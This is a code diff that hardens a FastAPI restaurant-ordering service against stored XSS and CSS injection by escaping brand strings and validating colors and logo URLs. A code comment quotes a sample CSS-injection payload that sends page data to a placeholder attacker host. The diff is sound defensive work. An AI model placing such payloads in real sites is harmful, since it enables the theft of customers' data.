@@ -4,12 +4,39 @@ Customer-facing pages — fully branded per client.
   GET /r/{slug}?table=T1&secret=ABC   → Registration page
   GET /menu/{slug}?t=T1&p=91xx&k=tok → Menu page
 """
+import html
 import os
+import re
 from fastapi import APIRouter
 from fastapi.responses import HTMLResponse
 from app.models.database import MasterSession, Client
 
 router = APIRouter()
+
+# Default brand color used whenever a tenant supplies no value, an empty
+# value, or one that fails strict validation. The exact shade matches the
+# previous baked-in default so visual regressions are minimal.
+_DEFAULT_PRIMARY_COLOR = "#ff6b35"
+# 6-digit hex color, with the leading #. Anything else (CSS expressions,
+# `red;}body{...}`, etc.) is rejected and replaced with the default. This
+# closes the CSS-injection / data-exfiltration vector from the previous
+# review (L9): a malicious owner could otherwise insert `red;}body{
+# background:url(//attacker/?x=}` into a `<style>` block.
+_HEX_COLOR_RE = re.compile(r"^#[0-9a-fA-F]{6}$")
+# Restrict logo / banner URLs to absolute http(s) URLs so a malicious owner
+# can't smuggle a `javascript:` URL into the page (which would then run
+# inside the customer's WhatsApp browser session).
+_HTTP_URL_RE = re.compile(r"^https?://[^\s\"'<>]+$", re.IGNORECASE)
+
+
+def _safe_color(value: str | None) -> str:
+    v = (value or "").strip()
+    return v if _HEX_COLOR_RE.match(v) else _DEFAULT_PRIMARY_COLOR
+
+
+def _safe_url(value: str | None) -> str:
+    v = (value or "").strip()
+    return v if _HTTP_URL_RE.match(v) else ""
 
 
 def _get_client(slug: str) -> Client | None:
@@ -27,14 +54,29 @@ def _css_vars(color: str) -> str:
 @router.get("/r/{slug}", response_class=HTMLResponse)
 async def registration_page(slug: str):
     c = _get_client(slug)
-    name     = c.restaurant_name if c else "Restaurant"
-    color    = (c.primary_color if c else "#ff6b35") or "#ff6b35"
-    logo     = (c.logo_url if c else "") or ""
-    welcome  = (c.welcome_message if c else "Welcome! Scan & Order") or "Welcome! Scan & Order"
-    banner   = (c.banner_image if c else "") or ""
+    # All user-supplied strings are HTML-escaped before being interpolated
+    # into the template. Without this, a malicious owner (or a super admin
+    # who copy-pasted a poisoned brand string) could inject `<script>` tags
+    # via `restaurant_name`, `welcome_message`, etc., resulting in stored XSS
+    # in every customer's browser when they scan a QR code.
+    name     = html.escape((c.restaurant_name if c else "Restaurant") or "Restaurant")
+    color    = _safe_color(c.primary_color if c else None)
+    logo     = _safe_url(c.logo_url if c else "")
+    welcome  = html.escape((c.welcome_message if c else "Welcome! Scan & Order") or "Welcome! Scan & Order")
+    banner   = _safe_url(c.banner_image if c else "")
+    # `slug` comes from the URL path — FastAPI already constrained it but
+    # we still escape it for the JS embed below.
+    slug_safe = html.escape(slug, quote=True)
 
-    logo_html = f'<img src="{logo}" alt="{name}" style="height:60px;object-fit:contain;margin-bottom:8px;border-radius:10px">' if logo else f'<div style="font-family:Syne,sans-serif;font-size:28px;font-weight:800;color:{color}">{name}</div>'
-    banner_html = f'<img src="{banner}" alt="banner" style="width:100%;height:140px;object-fit:cover;border-radius:16px 16px 0 0">' if banner else ""
+    logo_html = (
+        f'<img src="{logo}" alt="{name}" style="height:60px;object-fit:contain;margin-bottom:8px;border-radius:10px">'
+        if logo else
+        f'<div style="font-family:Syne,sans-serif;font-size:28px;font-weight:800;color:{color}">{name}</div>'
+    )
+    banner_html = (
+        f'<img src="{banner}" alt="banner" style="width:100%;height:140px;object-fit:cover;border-radius:16px 16px 0 0">'
+        if banner else ""
+    )
 
     return HTMLResponse(f"""<!DOCTYPE html>
 <html lang="en">
@@ -98,7 +140,7 @@ async def registration_page(slug: str):
   </div>
 </div>
 <script>
-  const BASE=window.location.origin, SLUG='{slug}';
+  const BASE=window.location.origin, SLUG='{slug_safe}';
   const params=new URLSearchParams(window.location.search);
   const table=params.get('table')||'', secret=params.get('secret')||'';
   if(table){{
@@ -166,12 +208,21 @@ async def registration_page(slug: str):
 @router.get("/menu/{slug}", response_class=HTMLResponse)
 async def menu_page(slug: str):
     c = _get_client(slug)
-    name    = c.restaurant_name if c else "Restaurant"
-    color   = (c.primary_color if c else "#ff6b35") or "#ff6b35"
-    logo    = (c.logo_url if c else "") or ""
-    welcome = (c.welcome_message if c else "") or ""
+    # Same escaping/validation as registration_page — the menu template is
+    # rendered with raw string substitution, so we have to make every brand
+    # value either HTML-safe (for text contexts) or strictly validated (for
+    # color/url attribute contexts).
+    name    = html.escape((c.restaurant_name if c else "Restaurant") or "Restaurant")
+    color   = _safe_color(c.primary_color if c else None)
+    logo    = _safe_url(c.logo_url if c else "")
+    welcome = html.escape((c.welcome_message if c else "") or "")
+    slug_safe = html.escape(slug, quote=True)
 
-    logo_html = f'<img src="{logo}" alt="{name}" style="height:40px;object-fit:contain;border-radius:8px">' if logo else f'<span style="font-family:Syne,sans-serif;font-size:18px;font-weight:800;color:{color}">{name}</span>'
+    logo_html = (
+        f'<img src="{logo}" alt="{name}" style="height:40px;object-fit:contain;border-radius:8px">'
+        if logo else
+        f'<span style="font-family:Syne,sans-serif;font-size:18px;font-weight:800;color:{color}">{name}</span>'
+    )
 
     # Read the menu HTML template and inject branding
     path = os.path.join(os.path.dirname(__file__), "..", "..", "static", "menu.html")
@@ -182,7 +233,7 @@ async def menu_page(slug: str):
         with open(path, encoding="utf-8") as f:
             content = f.read()
         content = (content
-            .replace("__SLUG__", slug)
+            .replace("__SLUG__", slug_safe)
             .replace("__RESTRO_NAME__", name)
             .replace("__COLOR__", color)
             .replace("__LOGO_HTML__", logo_html)
